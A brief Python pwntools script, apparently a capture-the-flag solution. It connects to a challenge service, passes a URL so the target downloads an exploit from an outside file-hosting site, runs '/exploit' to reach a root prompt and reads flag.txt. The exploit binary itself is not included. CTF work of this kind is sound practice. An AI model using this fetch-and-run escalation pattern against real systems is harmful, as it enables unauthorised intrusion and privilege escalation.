import subprocess
import argparse
from pwn import *

_HOST='127.0.0.1'
_PORT=31341

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('url', help='''URL pointing to where to download exploit.\n
                                       E.g. post on any temporary file upload site found online''')
    parser.add_argument('--remote', help=f'Remote host where challenge is hosted. Defaults to {_HOST}', default=_HOST)
    parser.add_argument('--port', help=f'Remote port where challenge is hosted. Defaults to {_PORT}', default=_PORT)
    return parser.parse_args()


def main():
    args = parse_args()
    
    p = remote(args.remote, args.port)
    p.sendlineafter(b':', str.encode(args.url))
    p.sendlineafter(b'$', b'/exploit')
    p.sendlineafter(b'#',b'cat flag.txt')
    p.recvline()
    print(p.recvline())
    

if __name__ == '__main__':
    main()
